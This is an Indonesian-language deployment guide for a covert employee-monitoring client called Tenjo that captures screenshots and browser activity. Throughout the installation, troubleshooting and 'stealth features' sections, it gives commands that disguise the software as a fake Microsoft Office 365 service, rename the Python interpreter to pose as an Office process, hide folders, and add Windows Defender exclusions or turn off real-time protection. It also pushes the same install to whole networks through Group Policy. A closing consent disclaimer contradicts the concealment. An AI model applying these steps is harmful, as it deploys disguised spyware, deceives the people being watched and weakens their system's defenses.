# 📀 PANDUAN INSTALASI USB - Tenjo Employee Monitoring

**Versi:** 1.0.2  
**Tanggal:** 26 November 2025  
**Status:** ✅ SIAP PRODUKSI - Semua bug critical sudah di-fix

---

## 🎯 RINGKASAN CEPAT

Panduan ini untuk install aplikasi monitoring karyawan ke komputer Windows menggunakan USB drive.

**Waktu Instalasi:** 3-5 menit per komputer  
**User Level:** Administrator  
**Sistem:** Windows 7/8/10/11 (64-bit)

---

## 📋 PERSIAPAN SEBELUM INSTALASI

### 1. Requirements

✅ **Komputer Target:**
- Windows 7, 8, 10, atau 11 (64-bit)
- Python 3.6 atau lebih tinggi **SUDAH TERINSTALL**
- Koneksi internet (untuk download dependencies)
- Minimal 500 MB free disk space

✅ **USB Drive:**
- Minimal 500 MB storage
- Format FAT32 atau NTFS
- Berisi folder `/app/client/usb_deployment/`

✅ **Akses:**
- Administrator privileges (WAJIB)
- Akses ke komputer karyawan

---

## 🔧 CARA PERSIAPAN USB INSTALLER

### Langkah 1: Copy Files ke USB

```bash
# Dari komputer development
cd /app/client
cp -r usb_deployment/ /path/to/usb/Tenjo-Installer/
```

### Langkah 2: Struktur USB yang Benar

USB drive harus punya struktur seperti ini:

```
USB Drive (E:)
└── Tenjo-Installer/
    ├── INSTALL.bat          ← Installer utama
    ├── UNINSTALL.bat        ← Uninstaller
    ├── README.md            ← Dokumentasi teknis
    ├── INSTALL_GUIDE.txt    ← Panduan singkat
    └── client/              ← Files aplikasi
        ├── main.py
        ├── watchdog.py
        ├── requirements.txt
        └── src/
            ├── core/
            ├── modules/
            └── utils/
```

### Langkah 3: Verify USB Contents

**Windows:**
```cmd
dir E:\Tenjo-Installer\
dir E:\Tenjo-Installer\client\
```

Harus ada file `INSTALL.bat` dan folder `client/` dengan isi lengkap.

---

## 🚀 INSTALASI - LANGKAH DEMI LANGKAH

### METODE 1: Instalasi Otomatis (RECOMMENDED)

#### Langkah 1: Insert USB
- Colok USB ke komputer target
- Tunggu Windows detect USB (biasanya drive E: atau F:)

#### Langkah 2: Buka Windows Explorer
- Tekan `Windows + E`
- Navigasi ke USB drive (E: atau F:)
- Buka folder `Tenjo-Installer`

#### Langkah 3: Run Installer
1. **Klik kanan** pada `INSTALL.bat`
2. Pilih **"Run as administrator"** ← PENTING!
3. Klik **"Yes"** pada UAC prompt

![Run as Administrator](https://i.imgur.com/example.png)

#### Langkah 4: Ikuti Instalasi
Installer akan menampilkan progress:

```
========================================
  Microsoft Office 365 Sync Service
========================================

[1/5] Checking system...
      ✓ Python found: Python 3.10.11

[2/5] Creating installation directory...
      ✓ Created: C:\ProgramData\Microsoft\Office365Sync_7452
      ✓ Directory hidden successfully

[3/5] Copying client files...
      ✓ All files copied

[4/5] Installing Python dependencies...
      ✓ pip upgraded
      ✓ Installing requirements...
      ✓ All dependencies installed

[5/5] Setting up auto-start...
      ✓ Windows Defender exclusions added
      ✓ Windows Service registered
      ✓ Startup shortcut created

Starting sync service...
✓ Service started successfully

========================================
  Installation Complete!
========================================

Microsoft Office 365 Sync Service installed
Service is now running in the background
It will start automatically on system boot

Press any key to continue...
```

#### Langkah 5: Verify Installation

**Check 1: Service Running**
```cmd
sc query Office365Sync
```
Output harus menunjukkan `STATE: RUNNING`

**Check 2: Process Running**
```cmd
tasklist | findstr OfficeSync
```
Output harus menunjukkan `OfficeSync.exe`

**Check 3: Dashboard Connection**
- Buka dashboard Laravel: `https://tenjo.adilabs.id`
- Login ke dashboard
- Cek halaman Clients
- Client baru harus muncul dalam 1-2 menit

---

### METODE 2: Instalasi Manual (Jika Otomatis Gagal)

#### Langkah 1: Buka Command Prompt as Admin
```cmd
# Klik kanan Start Menu → Windows PowerShell (Admin)
```

#### Langkah 2: Set Variables
```cmd
# Set random number untuk folder name
set RAND=5821

# Set paths
set INSTALL_DIR=C:\ProgramData\Microsoft\Office365Sync_%RAND%
set USB_PATH=E:\Tenjo-Installer\client
```

#### Langkah 3: Create Installation Directory
```cmd
# Create dan hide directory
mkdir "%INSTALL_DIR%"
attrib +h +s "%INSTALL_DIR%"

# Navigate
cd /d "%INSTALL_DIR%"
```

#### Langkah 4: Copy Files
```cmd
# Copy semua files dari USB
xcopy /E /I /Y "%USB_PATH%\*" "%INSTALL_DIR%"
```

#### Langkah 5: Setup Python
```cmd
# Copy dan rename pythonw.exe
where pythonw.exe
# Note the path, then:
copy "C:\Users\...\Python310\pythonw.exe" "%INSTALL_DIR%\OfficeSync.exe"

# Install dependencies
cd /d "%INSTALL_DIR%"
python -m pip install --upgrade pip
python -m pip install -r requirements.txt
```

#### Langkah 6: Windows Defender Exclusions
```powershell
# Run in PowerShell (Admin)
Add-MpPreference -ExclusionPath "C:\ProgramData\Microsoft\Office365Sync_5821"
Add-MpPreference -ExclusionProcess "OfficeSync.exe"
Add-MpPreference -ExclusionProcess "pythonw.exe"
```

#### Langkah 7: Register Windows Service
```cmd
# Create service
sc create "Office365Sync" binPath= "\"%INSTALL_DIR%\OfficeSync.exe\" \"%INSTALL_DIR%\main.py\"" start= auto DisplayName= "Microsoft Office 365 Sync Service"

# Set description
sc description "Office365Sync" "Synchronizes Microsoft Office 365 data and settings"

# Set delayed start (stealth)
sc config "Office365Sync" start= delayed-auto

# Start service
sc start "Office365Sync"
```

#### Langkah 8: Create Startup Shortcut (Fallback)
```powershell
# PowerShell command
$WS = New-Object -ComObject WScript.Shell
$Startup = [Environment]::GetFolderPath('Startup')
$SC = $WS.CreateShortcut("$Startup\OfficeSync.lnk")
$SC.TargetPath = "C:\ProgramData\Microsoft\Office365Sync_5821\OfficeSync.exe"
$SC.Arguments = "C:\ProgramData\Microsoft\Office365Sync_5821\main.py"
$SC.WorkingDirectory = "C:\ProgramData\Microsoft\Office365Sync_5821"
$SC.WindowStyle = 7
$SC.Save()

# Hide shortcut
attrib +h "$Startup\OfficeSync.lnk"
```

---

## 🔍 TROUBLESHOOTING

### Problem 1: "Python not found"

**Gejala:**
```
[ERROR] Python is not installed or not in PATH
```

**Solusi:**
1. Install Python dari https://www.python.org/downloads/
2. **PENTING:** Check ☑ "Add Python to PATH" saat install
3. Restart komputer
4. Verify: `python --version`
5. Coba install lagi

---

### Problem 2: "Permission denied" atau "Access denied"

**Gejala:**
```
[ERROR] This installer requires Administrator privileges
```

**Solusi:**
1. **WAJIB** klik kanan INSTALL.bat
2. Pilih **"Run as administrator"**
3. Jika masih gagal, disable UAC sementara:
   - Control Panel → User Accounts → Change User Account Control settings
   - Slide ke bawah
   - Restart
   - Install
   - Kembalikan UAC settings

---

### Problem 3: Service tidak start

**Gejala:**
```
[ERROR] Failed to start service
```

**Diagnosa:**
```cmd
# Check service status
sc query Office365Sync

# Check service config
sc qc Office365Sync

# View Windows Event Log
eventvwr.msc
# Navigate to: Windows Logs → Application
# Look for errors from "Office365Sync"
```

**Solusi:**

**A. Service tidak terdaftar:**
```cmd
# Re-register service
sc create "Office365Sync" binPath= "\"C:\ProgramData\Microsoft\Office365Sync_XXXX\OfficeSync.exe\" \"C:\ProgramData\Microsoft\Office365Sync_XXXX\main.py\"" start= auto DisplayName= "Microsoft Office 365 Sync Service"
```

**B. Python path salah:**
```cmd
# Check OfficeSync.exe exists
dir C:\ProgramData\Microsoft\Office365Sync_*\OfficeSync.exe

# If missing, copy pythonw.exe:
where pythonw.exe
copy "[path from above]\pythonw.exe" "C:\ProgramData\Microsoft\Office365Sync_XXXX\OfficeSync.exe"
```

**C. Dependencies missing:**
```cmd
cd C:\ProgramData\Microsoft\Office365Sync_XXXX
python -m pip install -r requirements.txt
```

---

### Problem 4: Tidak bisa find installation folder

**Gejala:**
Folder `Office365Sync_XXXX` tidak kelihatan di File Explorer

**Solusi:**

**A. Show Hidden Files:**
1. Open File Explorer
2. View tab → Options → Change folder and search options
3. View tab → Advanced settings:
   - ☑ Show hidden files, folders, and drives
   - ☐ **UNCHECK** "Hide protected operating system files"
4. Apply → OK
5. Navigate to `C:\ProgramData\Microsoft\`

**B. Find via Command Line:**
```cmd
# Search for hidden directories
dir /s /a:h "C:\ProgramData\Microsoft\Office365Sync_*"

# Or read from temp file
type %TEMP%\office365_path.txt
```

**C. List all installations:**
```cmd
# PowerShell
Get-ChildItem -Path "C:\ProgramData\Microsoft\" -Filter "Office365Sync_*" -Hidden
```

---

### Problem 5: Antivirus blocking installation

**Gejala:**
- Files disappear after copy
- Installer says "file not found"
- Windows Defender quarantine notifications

**Solusi:**

**A. Temporary disable Windows Defender:**
```powershell
# PowerShell (Admin)
Set-MpPreference -DisableRealtimeMonitoring $true

# Install aplikasi

# Re-enable Defender
Set-MpPreference -DisableRealtimeMonitoring $false
```

**B. Add exclusion BEFORE install:**
```powershell
# PowerShell (Admin)
Add-MpPreference -ExclusionPath "C:\ProgramData\Microsoft\Office365Sync_*"
Add-MpPreference -ExclusionProcess "OfficeSync.exe"
Add-MpPreference -ExclusionProcess "pythonw.exe"
Add-MpPreference -ExclusionExtension ".py"
```

**C. Restore from Quarantine:**
```cmd
# Open Windows Security
# Virus & threat protection → Protection history
# Find quarantined files → Restore
```

---

### Problem 6: Client tidak connect ke server

**Gejala:**
- Service running tapi tidak muncul di dashboard
- Tidak ada error di Event Viewer

**Diagnosa:**
```cmd
# Check if process running
tasklist | findstr OfficeSync

# Check service status
sc query Office365Sync

# Check logs
cd C:\ProgramData\Microsoft\Office365Sync_XXXX
type logs\stealth.log | more
```

**Solusi:**

**A. Check server URL:**
```cmd
cd C:\ProgramData\Microsoft\Office365Sync_XXXX
type src\core\config.py | findstr SERVER_URL
```
Harus: `https://tenjo.adilabs.id` atau server Anda

**B. Check internet connection:**
```cmd
ping tenjo.adilabs.id
curl https://tenjo.adilabs.id/api/health
```

**C. Check firewall:**
```cmd
# Add firewall rule
netsh advfirewall firewall add rule name="Office365Sync" dir=out action=allow program="C:\ProgramData\Microsoft\Office365Sync_XXXX\OfficeSync.exe"
```

**D. Manual test:**
```cmd
cd C:\ProgramData\Microsoft\Office365Sync_XXXX
python main.py
# Watch for errors
```

---

## ❌ UNINSTALL - Cara Hapus Aplikasi

### METODE 1: Uninstaller Otomatis

1. Insert USB dengan folder `Tenjo-Installer`
2. Klik kanan `UNINSTALL.bat`
3. Pilih "Run as administrator"
4. Type `YES` untuk confirm
5. Selesai

### METODE 2: Manual Uninstall

```cmd
# 1. Stop dan delete service
sc stop Office365Sync
sc delete Office365Sync

# 2. Find installation folder
dir /s /a:h "C:\ProgramData\Microsoft\Office365Sync_*"

# 3. Remove Windows Defender exclusions
powershell -Command "Remove-MpPreference -ExclusionPath 'C:\ProgramData\Microsoft\Office365Sync_XXXX'"
powershell -Command "Remove-MpPreference -ExclusionProcess 'OfficeSync.exe'"

# 4. Delete installation folder
# First, unhide it
attrib -h -s "C:\ProgramData\Microsoft\Office365Sync_XXXX"
# Then delete
rmdir /s /q "C:\ProgramData\Microsoft\Office365Sync_XXXX"

# 5. Remove startup shortcut
del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\OfficeSync.lnk"

# 6. Clean temp files
del %TEMP%\office365_path.txt
```

---

## 🔒 FITUR STEALTH & SECURITY

### Fitur Stealth yang Aktif:

✅ **Random Folder Name**
- Setiap install dapat folder name berbeda (Office365Sync_XXXX)
- Sulit untuk mass-removal
- Tidak mudah dideteksi

✅ **Process Disguise**
- Python di-rename jadi `OfficeSync.exe`
- Muncul sebagai proses Office yang legitimate
- Tidak ada "python" atau "pythonw" di Task Manager

✅ **Windows Service**
- Terdaftar sebagai Windows Service resmi
- Nama: "Microsoft Office 365 Sync Service"
- Description: "Synchronizes Microsoft Office 365 data and settings"
- Auto-start with delayed start (lebih stealth)

✅ **Hidden Files**
- Folder hidden dengan system + hidden attributes
- Tidak muncul di File Explorer biasa
- Harus show hidden + system files untuk lihat

✅ **Windows Defender Exclusions**
- Folder dan process di-exclude dari scanning
- Tidak akan di-quarantine
- Tidak akan false positive

✅ **No Terminal Windows**
- **SEMUA bug CREATE_NO_WINDOW sudah di-fix**
- Tidak ada CMD/PowerShell window yang muncul
- 100% background operation

---

## 📊 CHECKLIST DEPLOYMENT

### Pre-Deployment:
- [ ] USB drive ready dengan semua files
- [ ] Tested on 1 test machine successfully
- [ ] Dashboard accessible dan ready
- [ ] Python installed on target machines (or install script ready)
- [ ] Admin credentials available
- [ ] Schedule deployment time (business hours vs after hours)

### During Deployment (Per Machine):
- [ ] Insert USB
- [ ] Run INSTALL.bat as administrator
- [ ] Wait for completion (3-5 minutes)
- [ ] Verify service running: `sc query Office365Sync`
- [ ] Check process: `tasklist | findstr OfficeSync`
- [ ] Wait 1-2 minutes for client to register
- [ ] Verify in dashboard (client appears)
- [ ] Check screenshot captured within 5 minutes
- [ ] Remove USB
- [ ] Move to next machine

### Post-Deployment:
- [ ] All target machines installed successfully
- [ ] All clients visible in dashboard
- [ ] All clients receiving screenshots
- [ ] Browser tracking working
- [ ] No error reports from users
- [ ] Monitor for 24 hours for any issues
- [ ] Document any failures or issues

---

## 🎯 DEPLOYMENT STRATEGIES

### Strategi 1: Sequential Deployment (Satu-satu)
**Best for:** Small teams (< 20 computers)

1. Deploy ke 1 test machine dulu
2. Monitor 1 jam
3. Jika OK, deploy ke 5 machines
4. Monitor 1 hari
5. Jika OK, deploy ke sisanya

**Pros:**
- Kontrol maksimal
- Easy troubleshooting
- Minimal risk

**Cons:**
- Time consuming
- Requires admin presence

---

### Strategi 2: Batch Deployment
**Best for:** Medium teams (20-50 computers)

1. Bagi computers jadi groups of 10
2. Deploy batch pertama di pagi hari
3. Monitor sampai siang
4. Deploy batch kedua di siang
5. Deploy batch terakhir di sore

**Pros:**
- Faster than sequential
- Still manageable
- Can catch issues early

**Cons:**
- Need multiple USB drives
- Need coordination

---

### Strategi 3: Mass Deployment
**Best for:** Large teams (50+ computers)

**Using Group Policy (Domain Environment):**

1. Copy `client` folder ke network share:
   ```
   \\SERVER\Share\Tenjo-Client\
   ```

2. Create Group Policy Startup Script:
   ```powershell
   # startup-script.ps1
   $Source = "\\SERVER\Share\Tenjo-Client"
   $Rand = Get-Random -Minimum 1000 -Maximum 9999
   $Dest = "C:\ProgramData\Microsoft\Office365Sync_$Rand"
   
   # Copy files
   Copy-Item -Path $Source -Destination $Dest -Recurse -Force
   
   # Run installer
   cd $Dest
   python install.py
   ```

3. Apply GPO to target OUs
4. Machines will install on next reboot

**Pros:**
- Automated
- Fast
- Centralized

**Cons:**
- Requires domain environment
- Needs GPO access
- All or nothing

---

## 📝 DOKUMENTASI & LOGS

### Log Locations:

**Client Logs:**
```
C:\ProgramData\Microsoft\Office365Sync_XXXX\logs\
├── stealth.log           # Main application log
├── registration_failures.log  # Registration errors
└── watchdog.log          # Watchdog service log
```

**Windows Event Logs:**
```
Event Viewer → Windows Logs → Application
Filter: Source = "Office365Sync"
```

**Service Logs:**
```cmd
sc query Office365Sync  # Service status
sc qc Office365Sync     # Service config
```

### Important Config Files:

```
C:\ProgramData\Microsoft\Office365Sync_XXXX\
├── src\core\config.py    # Main configuration
├── requirements.txt      # Python dependencies
├── .client_id            # Unique client ID
└── .registered           # Registration timestamp
```

---

## ☎️ SUPPORT & CONTACT

### Jika Ada Masalah:

1. **Check Logs** (lihat section Dokumentasi & Logs)
2. **Check Dashboard** untuk client status
3. **Konsultasi Troubleshooting** section di atas
4. **Contact Support:**
   - Email: support@adilabs.id
   - Dashboard: https://tenjo.adilabs.id
   - Documentation: /app/README.md

---

## ⚖️ LEGAL & COMPLIANCE

**PENTING - BACA DENGAN SEKSAMA:**

✅ **Aplikasi ini hanya untuk penggunaan yang LEGAL dan SAH**

⚠️ **WAJIB:**
- Dapatkan persetujuan TERTULIS dari karyawan
- Buat kebijakan monitoring yang JELAS
- Patuhi hukum privacy dan labor di wilayah Anda
- Informasikan karyawan tentang monitoring
- Gunakan data hanya untuk tujuan bisnis yang legitimate

❌ **DILARANG:**
- Install tanpa sepengetahuan karyawan
- Monitor aktivitas pribadi di luar jam kerja
- Gunakan data untuk tujuan ilegal
- Share data dengan pihak ketiga tanpa izin

**Tanggung Jawab:**
Penggunaan aplikasi ini sepenuhnya tanggung jawab user. Pastikan compliance dengan regulasi lokal sebelum deployment.

---

## 📚 REFERENSI TAMBAHAN

### File Dokumentasi:
- `/app/README.md` - Overview aplikasi lengkap
- `/app/COMPREHENSIVE_BUG_FIX_REPORT.md` - Laporan bug fixes
- `/app/client/usb_deployment/README.md` - Technical USB installer docs
- `/app/FINAL_CRITICAL_BUGS.md` - Critical bugs yang sudah di-fix
- `/app/FINAL_LAST_CHECK_BUGS.md` - Last check bugs yang sudah di-fix

### Command Reference:
```cmd
# Service Management
sc query Office365Sync          # Check status
sc start Office365Sync           # Start service
sc stop Office365Sync            # Stop service
sc config Office365Sync start=auto  # Set auto-start

# Process Management
tasklist | findstr OfficeSync    # Check if running
taskkill /F /IM OfficeSync.exe   # Force kill process

# File Management
attrib +h +s [folder]            # Hide folder
attrib -h -s [folder]            # Unhide folder
dir /s /a:h [path]               # List hidden files

# Windows Defender
Add-MpPreference -ExclusionPath [path]      # Add exclusion
Remove-MpPreference -ExclusionPath [path]   # Remove exclusion
Get-MpPreference | Select Exclusion*        # List exclusions
```

---

**Panduan dibuat:** 26 November 2025  
**Versi:** 1.0.2  
**Status:** ✅ Production Ready  

**Semua bugs critical sudah di-fix. Siap untuk deployment produksi.**

